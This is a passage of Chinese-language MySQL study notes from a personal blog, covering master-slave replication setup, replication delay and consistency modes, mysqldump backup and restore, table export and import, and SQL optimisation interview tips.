<li><code>从库 SQL 线程</code> 会读取从库中的中继日志，并且执行日志中的事件，将从库中的数据与主库保持同步。</li>
</ul>
<p><strong>复制的步骤：</strong></p>
<p>步骤1： Master 将写操作记录到二进制日志（ binlog ）。<br>步骤2： Slave 将 Master 的binary log events拷贝到它的中继日志（ relay log ）；<br>步骤3： Slave 重做中继日志中的事件，将改变应用到自己的数据库中。 MySQL复制是异步的且串行化的，而且重启后从接入点开始复制。</p>
<p><strong>复制的主要问题：延迟</strong></p>
<p><strong>复制的基本原则</strong></p>
<ul>
<li>每个 Slave 只有一个 Master</li>
<li>每个 Slave 只能有一个唯一的服务器ID</li>
<li>每个 Master 可以有多个 Slave</li>
</ul>
<h3 id="一主一从架构的搭建"><a href="#一主一从架构的搭建" class="headerlink" title="一主一从架构的搭建"></a>一主一从架构的搭建</h3><p>主机处理所有<code>写请求</code>，从机处理所有<code>读请求</code>。</p>
<p><a href="https://www.bilibili.com/video/BV1iq4y1u7vj?spm_id_from=333.788.player.switch&vd_source=20530c92c1be8bd70e37346e3a5c037a&p=192">一主一从架构的搭建</a></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241210212425.png"></p>
<p>建议mysql版本一致且后台以服务运行，主从所有配置项都配置在 [mysqld] 节点下，且都是小写字母。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241210213302.png"></p>
<p><strong>注意：实验条件下主从机都需要关闭防火墙</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service iptables stop #CentOS 6</span><br><span class="line">systemctl stop firewalld.service #CentOS</span><br></pre></td></tr></table></figure>



<h4 id="主机基本配置"><a href="#主机基本配置" class="headerlink" title="主机基本配置"></a>主机基本配置</h4><p>修改（添加）配置文件的[mysqld]标签下的配置项：</p>
<p><strong>必须配置：</strong></p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主服务器唯一ID</span></span><br><span class="line">server-id = 1</span><br><span class="line"><span class="comment"># 启用二进制日志并指明路径</span></span><br><span class="line">log-bin = path/to/binlog</span><br></pre></td></tr></table></figure>

<p>可选</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0（默认）表示读写（主机），1表示只读（从机）</span></span><br><span class="line">read-only=0</span><br><span class="line"><span class="comment"># 设置日志文件保留的时长，单位是秒</span></span><br><span class="line">binlog_expire_logs_seconds=6000</span><br><span class="line"><span class="comment"># 控制单个二进制日志大小。此参数的最大和默认值是1GB</span></span><br><span class="line">max_binlog_size=200M</span><br><span class="line"><span class="comment"># 设置不要复制的数据库</span></span><br><span class="line">binlog-ignore-db=test</span><br><span class="line"><span class="comment"># 设置需要复制的数据库,默认全部记录。比如：binlog-do-db=nam_master_slave</span></span><br><span class="line">binlog-do-db=需要复制的主数据库名字</span><br><span class="line"><span class="comment"># 设置binlog格式</span></span><br><span class="line">binlog_format=STATEMENT</span><br></pre></td></tr></table></figure>

<p>重启后台mysql服务，使配置生效。</p>
<h4 id="从机基本配置"><a href="#从机基本配置" class="headerlink" title="从机基本配置"></a>从机基本配置</h4><p>修改（添加）配置文件的[mysqld]标签下的配置项：</p>
<p><strong>必须配置：</strong></p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从服务器唯一ID</span></span><br><span class="line">server-id=2</span><br></pre></td></tr></table></figure>

<p>可选</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启用中继日志</span></span><br><span class="line">relay-log=mysql-relay</span><br></pre></td></tr></table></figure>

<p>重启后台mysql服务，使配置生效。</p>
<h4 id="主机：建立账户并授权"><a href="#主机：建立账户并授权" class="headerlink" title="主机：建立账户并授权"></a>主机：建立账户并授权</h4><p>在主机MySQL里执行授权主从复制的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 5.5,5.7</span><br><span class="line">GRANT REPLICATION SLAVE ON *.* TO &#x27;slave1&#x27;@&#x27;从机器数据库IP&#x27; IDENTIFIED BY &#x27;abc123&#x27;;</span><br><span class="line"># 8.0</span><br><span class="line">CREATE USER &#x27;slave1&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27;;</span><br><span class="line">GRANT REPLICATION SLAVE ON *.* TO &#x27;slave1&#x27;@&#x27;%&#x27;;</span><br><span class="line">ALTER USER &#x27;slave1&#x27;@&#x27;%&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;123456&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

<p>查询Master的状态，并记录下File和Position的值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show master status;</span><br></pre></td></tr></table></figure>

<p>此后<strong>不要再操作主服务器MySQL</strong>，防止主服务器状态值变化。</p>
<h4 id="从机：配置需要复制的主机"><a href="#从机：配置需要复制的主机" class="headerlink" title="从机：配置需要复制的主机"></a>从机：配置需要复制的主机</h4><p>步骤1：从机上复制主机的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CHANGE MASTER TO</span><br><span class="line">MASTER_HOST=&#x27;主机的IP地址&#x27;,</span><br><span class="line">MASTER_USER=&#x27;主机用户名&#x27;,</span><br><span class="line">MASTER_PASSWORD=&#x27;主机用户名的密码&#x27;,</span><br><span class="line">MASTER_LOG_FILE=&#x27;mysql-bin.具体数字&#x27;,</span><br><span class="line">MASTER_LOG_POS=具体值;</span><br></pre></td></tr></table></figure>

<p>步骤2：启动slave同步</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">START SLAVE;</span><br><span class="line">-- 如果报错，执行：</span><br><span class="line">reset slave</span><br><span class="line">-- 然后从步骤1开始</span><br></pre></td></tr></table></figure>

<p>步骤3：查看同步状态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW SLAVE STATUS\G;</span><br></pre></td></tr></table></figure>



<h4 id="停止和重新开启主从同步"><a href="#停止和重新开启主从同步" class="headerlink" title="停止和重新开启主从同步"></a>停止和重新开启主从同步</h4><p>停止主从同步命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stop slave;</span><br></pre></td></tr></table></figure>

<p>如果停止从服务器复制功能，再使用需要重新配置主从，需要在从机上执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stop slave;</span><br><span class="line">reset master; #删除Master中所有的binglog文件，并将日志索引文件清空，重新开始所有新的日志文件(慎用)</span><br></pre></td></tr></table></figure>



<h3 id="同步数据一致性问题"><a href="#同步数据一致性问题" class="headerlink" title="同步数据一致性问题"></a>同步数据一致性问题</h3><p>主从同步的要求：</p>
<ol>
<li>读库和写库必须一致（最终一致）</li>
<li>写数据必须写到写库</li>
<li>读数据必须到读库</li>
</ol>
<p><strong>主从延迟产生的原因：</strong></p>
<p>在网络正常的时候，日志从主库传给从库所需的时间是很短的，即T2-T1的值是非常小的。即，网络正常情况下，主备延迟的主要来源是备库接收完binlog和执行完这个事务之间的时间差。主备延迟最直接的表现是，从库消费中继日志（relay log）的速度，比主库生产binlog的速度要慢。造成原因：</p>
<ol>
<li>从库的机器性能比主库要差</li>
<li>从库的压力大</li>
<li>大事务的执行</li>
</ol>
<p><strong>减少主从延迟的方法</strong></p>
<ol>
<li>降低多线程大事务并发的概率，优化业务逻辑</li>
<li>优化SQL，避免慢SQL， 减少批量操作 ，建议写脚本以update-sleep这样的形式完成。</li>
<li>提高从库机器的配置 ，减少主库写binlog和从库读binlog的效率差。</li>
<li>尽量采用 短的链路 ，也就是主库和从库服务器的距离尽量要短，提升端口带宽，减少binlog传输的网络延时。</li>
<li>实时性要求的业务读强制走主库，从库只做灾备，备份。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241211232816.png"></p>
<h4 id="如何解决一致性问题"><a href="#如何解决一致性问题" class="headerlink" title="如何解决一致性问题"></a>如何解决一致性问题</h4><h5 id="异步复制"><a href="#异步复制" class="headerlink" title="异步复制"></a>异步复制</h5><p>客户端提交commit后，<strong>无需等待从库返回任何结果</strong>，写库即将结果直接返回给客户端。这样不会影响主库写的效率，但可能存在主库宕机而binlog还未同步到从库导致主从不一致的情况。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241212002656.png"></p>
<h5 id="半同步复制"><a href="#半同步复制" class="headerlink" title="半同步复制"></a>半同步复制</h5><p>客户端提交commit后，<strong>等待至少一个从库接收到binlog并写入自己的中继日志后</strong>，写库再将结果返回给客户端。数据一致性强度提高，但响应时间增大。</p>
<p>通过参数<code>rpl_semi_sync_master_wait_for_slave_count</code>可以设置主库等待几个从库写入完成，默认为<code>1</code>，设为n时需要等待所有从库。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241212002937.png"></p>
<h5 id="组复制MGR"><a href="#组复制MGR" class="headerlink" title="组复制MGR"></a>组复制MGR</h5><p><strong>异步复制和半同步复制都无法最终保证数据的一致性问题</strong>，半同步复制是通过判断从库响应的个数来决定是否返回给客户端，虽然数据一致性相比于异步复制有提升，但仍然无法满足对数据一致性要求高的场景，比如金融领域。MGR 很好地弥补了这两种复制模式的不足。<br><code>组复制技术</code>，简称 <code>MGR（MySQL Group Replication）</code>。是 MySQL 在 5.7.17 版本中推出的一种新的数据复制技术，这种复制技术是基于 <code>Paxos 协议(经典的分布式一致性算法)</code>的状态机复制。</p>
<h6 id="MGR-是如何工作的"><a href="#MGR-是如何工作的" class="headerlink" title="MGR 是如何工作的"></a><strong>MGR 是如何工作的</strong></h6><p>首先我们将多个节点共同组成一个复制组，在 <strong>执行读写（RW）事务</strong> 的时候，需要通过一致性协议层（Consensus 层）的同意，也就是读写事务想要进行提交，必须要经过组里“大多数人”（对应 Node 节点）的同意，大多数指的是同意的节点数量需要大于 （N&#x2F;2+1），这样才可以进行提交，而不是原发起方一个说了算。而针对<strong>只读（RO）事务</strong> 则不需要经过组内同意，直接 COMMIT 即可。在一个复制组内有多个节点组成，它们各自维护了自己的数据副本，并且在一致性协议层实现了原子消息和全局有序消息，从而保证组内数据的一致性。</p>
<p>MGR <strong>将 MySQL 带入了数据强一致性</strong>的时代，是一个划时代的创新，其中一个重要的原因就是MGR 是基于 Paxos 协议的。Paxos 算法是由 2013 年的图灵奖获得者 Leslie Lamport 于 1990 年提出的。事实上，Paxos 算法提出来之后就作为 <code>分布式一致性算法</code> 被广泛应用，比如Apache 的 ZooKeeper 也是基于 Paxos 实现的。</p>
<h2 id="数据库备份和恢复"><a href="#数据库备份和恢复" class="headerlink" title="数据库备份和恢复"></a>数据库备份和恢复</h2><h3 id="物理备份和逻辑备份"><a href="#物理备份和逻辑备份" class="headerlink" title="物理备份和逻辑备份"></a>物理备份和逻辑备份</h3><p><code>物理备份</code>：备份数据文件，转储数据库物理文件到某一目录。物理备份恢复速度比较快，但占用空间比较大，MySQL中可以用 xtrabackup 工具来进行物理备份。</p>
<p><code>逻辑备份</code>：对数据库对象利用工具进行导出工作，汇总入备份文件内。逻辑备份恢复速度慢，但占用空间小，更灵活。MySQL 中常用的逻辑备份工具为 mysqldump 。<code>逻辑备份就是备份sql语句</code>，在恢复的时候执行备份的sql语句实现数据库数据的重现。</p>
<h4 id="mysqldump实现逻辑备份"><a href="#mysqldump实现逻辑备份" class="headerlink" title="mysqldump实现逻辑备份"></a>mysqldump实现逻辑备份</h4><p><strong>基本语法</strong>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldump -help # 查看帮助</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份一个数据库</span></span><br><span class="line">mysqldump –u 用户名称 –h 主机名称 –p密码 待备份的数据库名称[tbname, [tbname...]]&gt; 备份文件名</span><br><span class="line">称.sql</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如</span></span><br><span class="line">mysqldump -uroot -p test &gt; ./backup/test.sql</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份全部数据库</span></span><br><span class="line">mysqldump -uroot -p --all-databases &gt; name.sql;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份多个数据库</span></span><br><span class="line">mysqldump -uroot -p --databases base1 base2 base3... &gt; name.sql;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份单表的部分数据</span></span><br><span class="line">mysqldump -uroot -p databasename tablename --where=&quot;id &lt;= 100&quot; &gt; name.sql;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">排除某些表的备份</span></span><br><span class="line">mysqldump -uroot -p databasename --ignore-table=databasename.tablename &gt; name.sql;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只备份结构</span></span><br><span class="line">mysqldump -uroot -p databasename --no-data(简写为-d) &gt; name.sql;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只备份数据</span></span><br><span class="line">mysqldump -uroot -p databasename --no-create-info (简写为-t) &gt; name.sql;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份函数存储过程</span></span><br><span class="line">mysqldump -uroot -p -R -E --databases databasename &gt; name.sql;</span><br></pre></td></tr></table></figure>



<p>其他常用选项如下：</p>
<blockquote>
<p>–add-drop-database：在每个CREATE DATABASE语句前添加DROP DATABASE语句。<br>–add-drop-tables：在每个CREATE TABLE语句前添加DROP TABLE语句。<br>–add-locking：用LOCK TABLES和UNLOCK TABLES语句引用每个表转储。重载转储文件时插入得更快。<br>–all-database, -A：转储所有数据库中的所有表。与使用–database选项相同，在命令行中命名所有数据库。<br>–comment[&#x3D;0|1]：如果设置为0，禁止转储文件中的其他信息，例如程序版本、服务器版本和主机。–skip-comments与–comments&#x3D;0的结果相同。默认值为1，即包括额外信息。<br>–compact：产生少量输出。该选项禁用注释并启用–skip-add-drop-tables、–no-set-names、–skip-disable-keys和–skip-add-locking选项。<br>–compatible&#x3D;name：产生与其他数据库系统或旧的MySQL服务器更兼容的输出，值可以为ansi、MySQL323、MySQL40、postgresql、oracle、mssql、db2、maxdb、no_key_options、no_table_options或者no_field_options。<br>–complete_insert, -c：使用包括列名的完整的INSERT语句。<br>–debug[&#x3D;debug_options], -#[debug_options]：写调试日志。</p>
<p>–delete，-D：导入文本文件前清空表。<br>–default-character-set&#x3D;charset：使用charsets默认字符集。如果没有指定，就使用utf8。<br>–delete–master-logs：在主复制服务器上，完成转储操作后删除二进制日志。该选项自动启用-master-<br>data。<br>–extended-insert，-e：使用包括几个VALUES列表的多行INSERT语法。这样使得转储文件更小，重载文件时可以加速插入。<br>–flush-logs，-F：开始转储前刷新MySQL服务器日志文件。该选项要求RELOAD权限。<br>–force，-f：在表转储过程中，即使出现SQL错误也继续。<br>–lock-all-tables，-x：对所有数据库中的所有表加锁。在整体转储过程中通过全局锁定来实现。该选项自动关闭–single-transaction和–lock-tables。<br>–lock-tables，-l：开始转储前锁定所有表。用READ LOCAL锁定表以允许并行插入MyISAM表。对于事务表（例如InnoDB和BDB），–single-transaction是一个更好的选项，因为它根本不需要锁定表。<br>–no-create-db，-n：该选项禁用CREATE DATABASE &#x2F;<em>!32312 IF NOT EXIST</em>&#x2F;db_name语句，如果给出-<br>-database或–all-database选项，就包含到输出中。<br>–no-create-info，-t：只导出数据，而不添加CREATE TABLE语句。<br>–no-data，-d：不写表的任何行信息，只转储表的结构。<br>–opt：该选项是速记，它可以快速进行转储操作并产生一个能很快装入MySQL服务器的转储文件。该选项默认启，但可以用–skip-opt禁用。<br>–password[&#x3D;password]，-p[password]：当连接服务器时使用的密码。<br>-port&#x3D;port_num，-P port_num：用于连接的TCP&#x2F;IP端口号。<br>–protocol&#x3D;{TCP|SOCKET|PIPE|MEMORY}：使用的连接协议。<br>–replace，-r –replace和–ignore：控制替换或复制唯一键值已有记录的输入记录的处理。如果指定–replace，新行替换有相同的唯一键值的已有行；如果指定–ignore，复制已有的唯一键值的输入行被跳过。如果不指定这两个选项，当发现一个复制键值时会出现一个错误，并且忽视文本文件的剩余部分。<br>–silent，-s：沉默模式。只有出现错误时才输出。<br>–socket&#x3D;path，-S path：当连接localhost时使用的套接字文件（为默认主机）。<br>–user&#x3D;user_name，-u user_name：当连接服务器时MySQL使用的用户名。<br>–verbose，-v：冗长模式，打印出程序操作的详细信息。<br>–xml，-X：产生XML输出。</p>
</blockquote>
<h4 id="mysql命令恢复数据"><a href="#mysql命令恢复数据" class="headerlink" title="mysql命令恢复数据"></a>mysql命令恢复数据</h4><p><strong>基本语法：</strong></p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 基本语法</span></span><br><span class="line">mysql –u root –p [dbname] &lt; backup.sql</span><br><span class="line"><span class="comment"># 如果备份数据包含了创建数据库的语句，可以省略数据库名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 全量备份恢复 恢复全部数据</span></span><br><span class="line">mysql –u root –p &lt; all.sql</span><br><span class="line">mysql -uroot -pxxxxxx &lt; all.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从全量备份中恢复某一个数据库</span></span><br><span class="line"><span class="comment"># 首先从全量备份中提取出对应数据库的数据生成新备份文件</span></span><br><span class="line">sed -n &#x27;/^-- Current Database: `dbname`/,/^-- Current Database: `/p&#x27; all_database.sql(全量备份)</span><br><span class="line">&gt; atguigu.sql</span><br><span class="line"><span class="comment"># 然后使用基本语法恢复</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从单个数据库备份中恢复某一个表数据</span></span><br><span class="line"><span class="comment"># 首先用shell语法分离出创建表的语句及插入数据的语句后 再依次导出即可完成恢复</span></span><br><span class="line"><span class="comment"># 提取表结构</span></span><br><span class="line">cat atguigu.sql | sed -e &#x27;/./&#123;H;$!d;&#125;&#x27; -e &#x27;x;/CREATE TABLE `tableName`/!d;q&#x27; &gt; tableName_structure.sql</span><br><span class="line"><span class="comment"># 提取表数据</span></span><br><span class="line">cat atguigu.sql | grep --ignore-case &#x27;insert into `tableName`&#x27; &gt; tableName_data.sql</span><br><span class="line"><span class="comment"># 然后进入表所在数据库，执行命令恢复表</span></span><br><span class="line">source /path/to/tableName_structure.sql</span><br><span class="line">source /path/to/tableName_data.sql</span><br></pre></td></tr></table></figure>



<h4 id="物理备份：直接复制整个数据库"><a href="#物理备份：直接复制整个数据库" class="headerlink" title="物理备份：直接复制整个数据库"></a>物理备份：直接复制整个数据库</h4><p>直接将MySQL中的数据库文件复制出来。这种方法最简单，速度也最快。MySQL的数据库目录位置不一定相同：</p>
<ul>
<li>在Windows平台下，MySQL 8.0存放数据库的目录通常默认为 “ C:\ProgramData\MySQL\MySQLServer 8.0\Data ”或者其他用户自定义目录；</li>
<li>在Linux平台下，数据库目录位置通常为&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;；</li>
<li>在MAC OSX平台下，数据库目录位置通常为“&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data”</li>
</ul>
<p>但为了<strong>保证备份的一致性</strong>。需要保证：</p>
<ul>
<li>方式1：备份前，将服务器停止。</li>
<li>方式2：备份前，对相关表执行 <code>FLUSH TABLES WITH READ LOCK</code> 操作。这样当复制数据库目录中的文件时，允许其他客户继续查询表。同时，FLUSH TABLES语句来确保开始备份前将所有激活的索引页写入硬盘。</li>
</ul>
<p>这种方式方便、快速，但不是最好的备份方法，因为实际情况可能 <code>不允许停止MySQL服务器</code> 或者 <code>锁住表</code> ，而且这种方法 <code>对InnoDB存储引擎的表不适用</code>。对于MyISAM存储引擎的表，这样备份和还原很方便，但是还原时最好是相同版本的MySQL数据库，否则可能会存在文件类型不同的情况。<br>注意，物理备份完毕后，执行 <code>UNLOCK TABLES</code> 来结算其他客户对表的修改行为。</p>
<h4 id="物理恢复：直接复制到数据库目录"><a href="#物理恢复：直接复制到数据库目录" class="headerlink" title="物理恢复：直接复制到数据库目录"></a>物理恢复：直接复制到数据库目录</h4><p>步骤：</p>
<ol>
<li>将备份的数据库数据拷贝到数据目录下，并重启MySQL服务器</li>
<li>查询相关表的数据是否恢复。需要使用下面的 chown 操作。</li>
</ol>
<p><strong>要求</strong>：</p>
<ul>
<li><p>必须确保备份数据的数据库和待恢复的数据库服务器的主版本号相同。因为只有MySQL数据库主版本号相同时，才能保证这两个MySQL数据库文件类型是相同的。</p>
</li>
<li><p>这种方式对 MyISAM类型的表比较有效 ，对于InnoDB类型的表则不可用。因为InnoDB表的表空间不能直接复制。</p>
</li>
<li><p>在Linux操作系统下，复制到数据库目录后，一定要将数据库的用户和组变成mysql，命令如下：</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown -R mysql.mysql /var/lib/mysql/dbname</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="表的导出与导入"><a href="#表的导出与导入" class="headerlink" title="表的导出与导入"></a>表的导出与导入</h3><h4 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h4><p>1.<strong>使用SELECT…INTO OUTFILE导出文本文件</strong><br>在MySQL中，可以使用SELECT…INTO OUTFILE语句将表的内容导出成一个文本文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- mysql默认对导出的目录有权限限制，也就是说使用命令行进行导出的时候，需要指定目录进行操作。</span><br><span class="line">-- 查询secure_file_priv值：</span><br><span class="line">SHOW GLOBAL VARIABLES LIKE &#x27;%secure%&#x27;;</span><br><span class="line"></span><br><span class="line">select * from tablename into outfile &#x27;/path/to/the/file.txt&#x27; # 必须是secure_file_priv指明的路径下的文件</span><br></pre></td></tr></table></figure>

<p><strong>2.使用mysqldump命令导出文本文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -p -T &quot;/var/lib/mysql-files/&quot; atguigu account</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用mysqldump将atguigu数据库中的account表导出到文本文件，使用FIELDS选项，要求字段之间使用逗号“，”间隔，所有字符类型字段值用双引号括起来：</span></span><br><span class="line">mysqldump -uroot -p -T &quot;/var/lib/mysql-files/&quot; atguigu account --fields-terminated-by=&#x27;,&#x27; --fields-optionally-enclosed-by=&#x27;\&quot;&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>3.使用mysql命令导出文本文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用mysql语句导出atguigu数据中account表中的记录到文本文件：</span></span><br><span class="line">mysql -uroot -p --execute=&quot;SELECT * FROM account;&quot; atguigu&gt; &quot;/var/lib/mysql-files/account.txt&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将atguigu数据库account表中的记录导出到文本文件，使用--veritcal参数将该条件记录分为多行显示：</span></span><br><span class="line">mysql -uroot -p --vertical --execute=&quot;SELECT * FROM account;&quot; atguigu &gt; &quot;/var/lib/mysql-files/account_1.txt&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将atguigu数据库account表中的记录导出到xml文件，使用--xml参数，具体语句如下。</span></span><br><span class="line">mysql -uroot -p --xml --execute=&quot;SELECT * FROM account;&quot; atguigu&gt;&quot;/var/lib/mysql-files/account_3.xml&quot;</span><br></pre></td></tr></table></figure>

<h4 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h4><p><strong>1.使用LOAD DATA INFILE方式导入文本文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用SELECT...INTO OUTFILE将atguigu数据库中account表的记录导出到文本文件</span><br><span class="line">LOAD DATA INFILE &#x27;/var/lib/mysql-files/account_0.txt&#x27; INTO TABLE atguigu.account</span><br></pre></td></tr></table></figure>

<p><strong>2.使用mysqlimport方式导入文本文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用mysqlimport命令将account.txt文件内容导入到数据库atguigu的account表中:</span></span><br><span class="line">mysqlimport -uroot -p atguigu &#x27;/var/lib/mysql-files/account.txt&#x27; --fields-terminated-by=&#x27;,&#x27; --fields-optionally-enclosed-by=&#x27;\&quot;&#x27;</span><br></pre></td></tr></table></figure>



<h3 id="数据库防误删和恢复"><a href="#数据库防误删和恢复" class="headerlink" title="数据库防误删和恢复"></a>数据库防误删和恢复</h3><p>针对预防误删数据的问题，建议如下：</p>
<ol>
<li>把 sql_safe_updates 参数设置为 on 。这样一来，如果我们忘记在delete或者update语句中写where条件，或者where条件里面没有包含索引字段的话，这条语句的执行就会报错。</li>
<li>代码上线前，必须经过 SQL审计 。</li>
</ol>
<p><strong>预防误删库&#x2F;表的方法</strong></p>
<ol>
<li>账号分离 。这样做的目的是，避免写错命令。比如：只给业务开发同学DML权限，而不给truncate&#x2F;drop权限。而如果业务开发人员有DDL需求的话，可以通过开发管理系统得到支持。即使是DBA团队成员，日常也都规定只使用 只读账号 ，必要的时候才使用有更新权限的账号。</li>
<li>制定操作规范 。比如：在删除数据表之前，必须先 对表做改名 操作。然后，观察一段时间，确保对业务无影响以后再删除这张表。改表名的时候，要求给表名加固定的后缀（比如加 _to_be_deleted )，然后删除表的动作必须通过管理系统执行。并且，管理系统删除表的时候，只能删除固定后缀的表。</li>
<li>设置延迟复制备库</li>
</ol>
<h2 id="DCL数据控制"><a href="#DCL数据控制" class="headerlink" title="DCL数据控制"></a>DCL数据控制</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
<th align="left">作用</th>
<th align="left">注意事项</th>
</tr>
</thead>
<tbody><tr>
<td align="left">COMMIT</td>
<td align="left">提交事务，将修改永久保存到数据库</td>
<td align="left">确保事务的完整性</td>
<td align="left">必须在事务结束前执行，执行后不可回滚</td>
</tr>
<tr>
<td align="left">ROLLBACK</td>
<td align="left">回滚事务，撤销所有修改操作</td>
<td align="left">保护数据的完整性</td>
<td align="left">只能在已开启的事务中使用，已提交的事务无法回滚</td>
</tr>
</tbody></table>
<h1 id="存疑"><a href="#存疑" class="headerlink" title="存疑"></a>存疑</h1><p><img src="D:\workinenglish\typora_image\image-20241031225456531-1731302687478-1.png" alt="image-20241031225456531"></p>
<p><a href="https://www.bilibili.com/video/BV1iq4y1u7vj?spm_id_from=333.788.player.switch&vd_source=20530c92c1be8bd70e37346e3a5c037a&p=126">行溢出-varchar到底能存几个字节</a></p>
<p>7-8分钟讲解部分。</p>
<p><img src="D:\workinenglish\typora_image\image-20241101163200726-1731302687479-2.png" alt="image-20241101163200726"></p>
<h1 id="面试记录"><a href="#面试记录" class="headerlink" title="面试记录"></a>面试记录</h1><h2 id="常用的SQL性能优化方法"><a href="#常用的SQL性能优化方法" class="headerlink" title="常用的SQL性能优化方法"></a>常用的SQL性能优化方法</h2><h3 id="一、索引优化"><a href="#一、索引优化" class="headerlink" title="一、索引优化"></a>一、索引优化</h3><ol>
<li><strong>创建适当的索引</strong>：在经常用于查询、排序和连接的列上创建索引，可以显著提高查询性能。</li>
<li><strong>删除不必要的索引</strong>：过多的索引会增加插入、更新和删除操作的开销，因此应定期审查并删除不再需要的索引。</li>
<li><strong>使用覆盖索引</strong>：尽量使用覆盖索引，即查询的列完全包含在索引中，从而避免回表操作。</li>
</ol>
<h3 id="二、查询优化"><a href="#二、查询优化" class="headerlink" title="二、查询优化"></a>二、查询优化</h3><ol>
<li><strong>避免全表扫描</strong>：通过创建索引、优化查询条件等方式，尽量避免全表扫描。</li>
<li><strong>选择合适的查询类型</strong>：根据实际需求选择合适的查询类型，如SELECT、INSERT、UPDATE等。</li>
<li><strong>优化JOIN操作</strong>：使用适当的JOIN条件，避免不必要的多表连接。在可能的情况下，使用子查询代替多表连接，但要注意子查询的性能开销。</li>
<li><strong>使用合适的字段类型</strong>：选择适当的字段类型，如使用数值类型代替字符串类型，以提高查询性能。</li>
<li><strong>避免使用NULL值</strong>：在创建表时，尽量避免使用NULL值，可以使用NOT NULL约束，并用特殊值（如0、-1）代替NULL。</li>
<li><strong>优化WHERE子句</strong>：避免在WHERE子句中使用OR、!&#x3D;或&lt;&gt;操作符，这些操作符可能导致索引失效。尽量使用IN、BETWEEN等操作符，并优化IN子句中的值列表顺序。</li>
</ol>
<h3 id="三、表结构优化"><a href="#三、表结构优化" class="headerlink" title="三、表结构优化"></a>三、表结构优化</h3><ol>
<li><strong>选择合适的表结构</strong>：根据实际需求选择合适的表结构，如规范化或非规范化。规范化可以减少数据冗余，但可能增加查询复杂度；非规范化则可以提高查询性能，但可能增加数据冗余。</li>
<li><strong>使用合适的存储引擎</strong>：如MySQL的InnoDB存储引擎，它支持事务、行级锁和更好的恢复性，在高并发下性能更好。</li>
<li><strong>定期维护索引</strong>：定期运行索引维护任务，如重建索引、更新统计信息等，以保持索引的有效性。</li>
</ol>
<h3 id="四、数据库配置和硬件优化"><a href="#四、数据库配置和硬件优化" class="headerlink" title="四、数据库配置和硬件优化"></a>四、数据库配置和硬件优化</h3><ol>
<li><strong>启用查询缓存</strong>：如果数据库支持查询缓存，可以启用它以存储经常执行的查询结果，从而提高查询性能。</li>
<li><strong>优化缓存设置</strong>：根据实际需求调整数据库缓存的大小和策略，以提高缓存命中率。</li>
<li><strong>使用连接池</strong>：复用数据库连接可以减少连接开销，提高性能。调整连接池大小以平衡性能和资源利用。</li>
<li><strong>升级硬件</strong>：如增加CPU、内存和使用SSD或NVMe存储等，可以显著提高数据库性能。</li>
</ol>
<h3 id="五、使用优化工具和分析方法"><a href="#五、使用优化工具和分析方法" class="headerlink" title="五、使用优化工具和分析方法"></a>五、使用优化工具和分析方法</h3><ol>
